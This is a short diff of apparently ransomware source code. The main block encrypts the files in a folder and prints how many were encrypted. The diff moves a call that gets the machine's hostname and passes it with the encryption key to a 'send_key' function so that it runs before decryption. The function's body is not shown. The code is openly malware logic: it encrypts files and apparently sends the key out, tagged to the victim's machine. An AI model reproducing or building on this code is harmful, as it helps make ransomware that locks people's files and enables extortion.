@@ -175,9 +175,9 @@ if __name__ == '__main__':
     number_encrypted_files = ransomware.encrypt_files_in_folder(key, path)
     print('Number of encrypted files: {}'.format(number_encrypted_files))
 
+    hostname = socket.gethostname()
+    send_key(hostname, key)
+
     # Decrypt files located in the given directory
     number_decrypted_files = ransomware.decrypt_files_in_folder(path)
     print('Number of decrypted files: {}'.format(number_decrypted_files))
-
-    hostname = socket.gethostname()
-    send_key(hostname, key)
